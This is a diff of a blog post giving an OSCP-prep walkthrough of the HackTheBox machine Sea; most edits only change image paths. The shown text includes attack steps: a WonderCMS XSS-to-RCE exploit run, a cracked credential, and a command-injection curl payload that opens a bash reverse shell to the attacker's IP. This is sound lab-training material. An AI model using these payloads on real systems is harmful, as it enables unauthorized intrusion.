@@ -4,9 +4,11 @@ draft = false
 title = 'HTB: Sea - OSCP Prep Write-up'
 tags = ['htb', 'oscp', 'lain-kusanagi', 'write-up', 'linux', 'web', 'xss', 'rce', 'wondercms']
 description = 'Write-up for the HackTheBox machine Sea - part of my OSCP preparation journey following the Lain Kusanagi list.'
-cover.image = '/images/htb-sea/cover.png'
 ShowToc = true
 TocOpen = false
+
+[cover]
+image = '/joaobonin/images/htb-sea/cover.png'
 +++
 
 ## Why this post exists
@@ -41,11 +43,11 @@ The goal of these posts is not just to document the solution, but to consolidate
 rustscan -a 10.129.20.94 -- -sV -sC -Pn -A
 ```
 
-![RustScan initial scan](/images/htb-sea/rustscan.png)
+![RustScan initial scan](/joaobonin/images/htb-sea/rustscan.png)
 
 Open ports: **22** (SSH) and **80** (HTTP).
 
-![Nmap results](/images/htb-sea/nmap-results.png)
+![Nmap results](/joaobonin/images/htb-sea/nmap-results.png)
 
 - **Port 22**: OpenSSH 8.2p1 Ubuntu
 - **Port 80**: Apache 2.4.41 (Ubuntu)
@@ -56,7 +58,7 @@ Open ports: **22** (SSH) and **80** (HTTP).
 whatweb http://10.129.20.94/
 ```
 
-![WhatWeb output](/images/htb-sea/whatweb.png)
+![WhatWeb output](/joaobonin/images/htb-sea/whatweb.png)
 
 Tech stack: **Apache 2.4.41**, **PHP** (PHPSESSID), **Bootstrap 3.3.7**, **jQuery 1.12.4**. Title: "Sea - Home".
 
@@ -68,25 +70,25 @@ Tech stack: **Apache 2.4.41**, **PHP** (PHPSESSID), **Bootstrap 3.3.7**, **jQuer
 
 The main page shows a cycling competition website with the **velik71** theme.
 
-![Port 80 - Homepage](/images/htb-sea/port80.png)
+![Port 80 - Homepage](/joaobonin/images/htb-sea/port80.png)
 
 Browsing the site we find a "How can I participate?" page with a link to a **contact form**.
 
-![Participate page](/images/htb-sea/participate-page.png)
+![Participate page](/joaobonin/images/htb-sea/participate-page.png)
 
 The contact form at `contact.php` has fields for Name, Email, Age, Country and **Website**.
 
-![Contact form](/images/htb-sea/contact-form.png)
+![Contact form](/joaobonin/images/htb-sea/contact-form.png)
 
 ### Identifying the CMS
 
 Looking at the page source code, I noticed images were being loaded from `/themes/bike/`, indicating the use of a theme called "bike".
 
-![Source code showing /themes/bike/ path](/images/htb-sea/source-code-theme.png)
+![Source code showing /themes/bike/ path](/joaobonin/images/htb-sea/source-code-theme.png)
 
 A quick Google search for "velik71" reveals this is a **WonderCMS** theme called "bike", available at `https://github.com/robiso/bike`.
 
-![WonderCMS bike theme](/images/htb-sea/wondercms-bike-theme.png)
+![WonderCMS bike theme](/joaobonin/images/htb-sea/wondercms-bike-theme.png)
 
 With the theme directory identified, I ran a directory brute force with feroxbuster to enumerate files:
 
@@ -94,7 +96,7 @@ With the theme directory identified, I ran a directory brute force with feroxbus
 feroxbuster --url http://sea.htb/themes/bike -w /usr/share/wordlists/dirb/common.txt -x php
 ```
 
-![Feroxbuster results](/images/htb-sea/feroxbuster.png)
+![Feroxbuster results](/joaobonin/images/htb-sea/feroxbuster.png)
 
 Among the results, the `/themes/bike/version` endpoint returned version **3.2.0**.
 
@@ -116,7 +118,7 @@ I used the exploit from [prodigiousMind/CVE-2023-41425](https://github.com/prodi
 python exploit.py http://sea.htb/loginURL 10.10.14.208 4444
 ```
 
-![Exploit output](/images/htb-sea/exploit-output.png)
+![Exploit output](/joaobonin/images/htb-sea/exploit-output.png)
 
 The exploit generates `xss.js`, starts an HTTP server on port 8000, and instructs you to send the malicious link to the admin. Since the target has no internet access, we need to host `main.zip` (revshell module) locally:
 
@@ -129,45 +131,45 @@ wget https://github.com/prodigiousMind/revshell/archive/refs/heads/main.zip
 
 I submitted the payload in the Website field of the contact form and opened netcat:
 
-![Submitting XSS](/images/htb-sea/xss-submit.png)
+![Submitting XSS](/joaobonin/images/htb-sea/xss-submit.png)
 
 The `xss.js` was requested by the target - the XSS executed:
 
-![XSS callback received](/images/htb-sea/xss-callback.png)
+![XSS callback received](/joaobonin/images/htb-sea/xss-callback.png)
 
 But no reverse shell. Time to debug `xss.js`.
 
-![xss.js original code](/images/htb-sea/xss-js-original.png)
+![xss.js original code](/joaobonin/images/htb-sea/xss-js-original.png)
 
 The problem was in the `urlWithoutLogBase` variable. Using the browser console to simulate:
 
-![Debug urlWithoutLogBase](/images/htb-sea/debug-urlbase.png)
+![Debug urlWithoutLogBase](/joaobonin/images/htb-sea/debug-urlbase.png)
 
 `urlWithoutLogBase` resolved to `/`, making `urlRev` become `//?installModule=...` - an invalid URL:
 
-![Debug urlRev broken](/images/htb-sea/debug-urlrev.png)
+![Debug urlRev broken](/joaobonin/images/htb-sea/debug-urlrev.png)
 
 ### Fix 1: Hardcode urlWithoutLogBase
 
 I edited the exploit to hardcode `urlWithoutLogBase = 'http://sea.htb/'`:
 
-![Fixed urlWithoutLogBase](/images/htb-sea/exploit-fix-urlbase.png)
+![Fixed urlWithoutLogBase](/joaobonin/images/htb-sea/exploit-fix-urlbase.png)
 
 I resubmitted the form. This time the target made requests to `main.zip`, but I got an error - the exploit was using `https://` for the installModule URL, but the python server was serving via `http://`:
 
-![Error after fix](/images/htb-sea/exploit-error.png)
+![Error after fix](/joaobonin/images/htb-sea/exploit-error.png)
 
 ### Fix 2: HTTPS to HTTP
 
 I changed `https://` to `http://` in the installModule URL inside the exploit. Resubmitted once more:
 
-![Final successful exploit](/images/htb-sea/exploit-final-success.png)
+![Final successful exploit](/joaobonin/images/htb-sea/exploit-final-success.png)
 
 The target fetched `xss.js`, then `main.zip`, installed the module, and we got a **reverse shell!**
 
 ### Shell as www-data
 
-![Shell as www-data](/images/htb-sea/shell-www-data.png)
+![Shell as www-data](/joaobonin/images/htb-sea/shell-www-data.png)
 
 Upgrade to interactive TTY:
 
@@ -175,7 +177,7 @@ Upgrade to interactive TTY:
 python3 -c 'import pty;pty.spawn("/bin/bash")'
 ```
 
-![TTY upgrade](/images/htb-sea/tty-upgrade.png)
+![TTY upgrade](/joaobonin/images/htb-sea/tty-upgrade.png)
 
 ---
 
@@ -185,7 +187,7 @@ python3 -c 'import pty;pty.spawn("/bin/bash")'
 
 Browsing `/var/www/sea/data/`, I found the WonderCMS `database.js` file containing a bcrypt hash:
 
-![database.js with hash](/images/htb-sea/database-js.png)
+![database.js with hash](/joaobonin/images/htb-sea/database-js.png)
 
 ```
 $2y$10$iOrk210RQSAzNCx6Vyq2X.aJ\/D.GuE4jRIikYiWrD3TM\/PjDnXm4q
@@ -197,7 +199,7 @@ $2y$10$iOrk210RQSAzNCx6Vyq2X.aJ\/D.GuE4jRIikYiWrD3TM\/PjDnXm4q
 john hash --wordlist=/usr/share/wordlists/rockyou.txt
 ```
 
-![John cracked](/images/htb-sea/john-crack.png)
+![John cracked](/joaobonin/images/htb-sea/john-crack.png)
 
 Cracked password: **mychemicalromance**
 
@@ -214,11 +216,11 @@ wget 10.10.14.208:8000/linpeas.sh -O l.sh
 chmod +x l.sh && ./l.sh
 ```
 
-![LinPEAS download](/images/htb-sea/linpeas-download.png)
+![LinPEAS download](/joaobonin/images/htb-sea/linpeas-download.png)
 
 LinPEAS revealed interesting internal ports:
 
-![Active ports](/images/htb-sea/active-ports.png)
+![Active ports](/joaobonin/images/htb-sea/active-ports.png)
 
 - **127.0.0.1:8080** - internal web service
 - **127.0.0.1:36189** - another service
@@ -232,21 +234,21 @@ ssh -N -L 9999:localhost:8080 amay@10.129.20.94
 # password: mychemicalromance
 ```
 
-![SSH port forward](/images/htb-sea/ssh-portforward.png)
+![SSH port forward](/joaobonin/images/htb-sea/ssh-portforward.png)
 
 ### System Monitor - Command Injection
 
 Accessing `http://localhost:9999` on Kali, logged in with `amay:mychemicalromance`:
 
-![Login 8080](/images/htb-sea/login-8080.png)
+![Login 8080](/joaobonin/images/htb-sea/login-8080.png)
 
 The application is a **System Monitor (Developing)** with management features:
 
-![System Monitor](/images/htb-sea/system-monitor.png)
+![System Monitor](/joaobonin/images/htb-sea/system-monitor.png)
 
 The "Analyze" button sends a POST request with the `log_file` parameter. Intercepting with browser DevTools:
 
-![Analyze log request](/images/htb-sea/analyze-log.png)
+![Analyze log request](/joaobonin/images/htb-sea/analyze-log.png)
 
 The `log_file` parameter points to `/var/log/apache2/access.log`. I tested command injection with `ping`:
 
@@ -275,7 +277,7 @@ curl 'http://localhost:9999/' \
 
 Confirmed via tcpdump - ICMP echo request received:
 
-![tcpdump confirm](/images/htb-sea/tcpdump-confirm.png)
+![tcpdump confirm](/joaobonin/images/htb-sea/tcpdump-confirm.png)
 
 ### Root shell
 
@@ -304,7 +306,7 @@ curl 'http://localhost:9999/' \
   --data-raw 'log_file=%2Fvar%2Flog%2Fauth.log;bash+-c+"bash+-i+>%26+/dev/tcp/10.10.14.208/443+0>%261"&analyze_log='
 ```
 
-![Root shell](/images/htb-sea/root-shell.png)
+![Root shell](/joaobonin/images/htb-sea/root-shell.png)
 
 **Root!**
 
